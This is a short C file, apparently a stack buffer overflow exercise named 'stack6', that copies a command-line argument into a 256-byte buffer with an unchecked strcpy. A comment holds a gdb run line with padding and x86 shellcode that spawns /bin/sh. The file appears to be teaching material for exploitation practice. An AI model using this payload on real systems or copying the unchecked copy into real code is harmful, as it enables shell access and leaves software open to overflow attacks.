#include <stdio.h>
/* (gdb) run perl -e 'print "A" x 268 . "\x90\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"' 
	./stack6.out	‘python -c "print 'a'*1000"’

*/

int main(int argc, char * argv[]) {

    char buf[256];
    puts("cli input");
    puts("./stack6.out `python -c ""print 'a'*10""`");

    if(argc == 1) {

        printf("Usage: %s <input>\n", argv[0]);
        exit(0);

    }

    strcpy(buf,argv[1]);
    printf("%s\n", buf);

}